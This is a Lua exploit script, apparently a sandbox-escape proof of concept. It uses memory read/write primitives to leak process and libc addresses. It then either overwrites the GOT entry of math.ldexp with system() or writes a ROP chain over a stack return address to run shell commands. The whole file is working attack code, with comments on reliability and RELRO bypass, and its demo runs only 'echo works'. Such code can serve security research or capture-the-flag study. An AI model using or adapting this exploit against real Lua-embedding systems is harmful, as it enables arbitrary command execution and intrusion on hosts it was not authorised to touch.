-- work around linter not liking math.ldexp
local key = 'ld' .. 'exp'
local math_ldexp = math[key]

-- overwrites GOT entry for ldexp with the address of system()
local function got_overwrite()
    -- populate got
    _ = math_ldexp(5, 10)
    _ = string.lower("A")

    local proc_base = addrOf(math_ldexp) - MATH_LDEXP_OFF
    local tolower_got_plt_addr = proc_base + TOLOWER_GOT_PLT_OFF
    local ldexp_got_plt_addr = proc_base + LDEXP_GOT_PLT_OFF

    local libc_base = deubPTRSIZE(read(tolower_got_plt_addr, PTRSIZE)) - TOLOWER_OFF
    local system_addr = libc_base + SYSTEM_OFF

    write(ldexp_got_plt_addr, ubPTRSIZE(system_addr))
end

local got_written = false

-- abuse overwritten GOT to call system()
local function got(commandPtr)
    if not got_written then
        got_overwrite()
        got_written = true
    end
    commandPtr = commandPtr .. '\x00'

    -- passed in eax, for 64-bit
    local strPtr = dataPtr(commandPtr)

    -- passed on stack, for 32-bit
    local data = ub4(strPtr) .. ub4(strPtr)
    local obj = craftObject(data)
    local stackPtr = _asnum(obj)

    _ = math_ldexp(stackPtr, strPtr)
end

-- craft ROP chain, scan stack for return from lua_pcallk in main, write chain there
local function ropper(command)
    -- populate GOT
    _ = string.lower('A')

    local proc_base = addrOf(string.lower) - STRING_LOWER_OFF
    local overwritten_ret_address = proc_base + OVERWRITTEN_RET_OFF
    local pop_rdi_ret = proc_base + POP_RDI_RET_OFF
    local ret = pop_rdi_ret + 1
    local tolower_got_plt_addr = proc_base + TOLOWER_GOT_PLT_OFF

    local libc_base = deubPTRSIZE(read(tolower_got_plt_addr, PTRSIZE)) - TOLOWER_OFF
    -- actual environ lives in linker?
    local environ_got = libc_base + ENVIRON_GOT_OFF
    local system_addr = libc_base + SYSTEM_OFF
    local exit = libc_base + EXIT_OFF

    local environ_x = read(environ_got, PTRSIZE)
    local stack_addr = deubPTRSIZE(read(deubPTRSIZE(environ_x), PTRSIZE))
    stack_addr = stack_addr - (stack_addr % PTRSIZE)

    command = command .. '\x00'
    local command_ptr = dataPtr(command)

    local payload = PAYLOAD

    local target_addr = ubPTRSIZE(overwritten_ret_address)
    local write_addr = search_backwards(stack_addr, target_addr)
    if write_addr == nil then error("nil") end

    -- works without this, ~90% of the time, but crashes sometimes
    collectgarbage('stop')
    write(write_addr, payload)
end

local function main()
    -- one-shot, but works with RELRO
    ropper("echo works")

    -- repeatable, but breaks with RELRO
    --got("echo yay")
    --got("echo woo")
end

main()
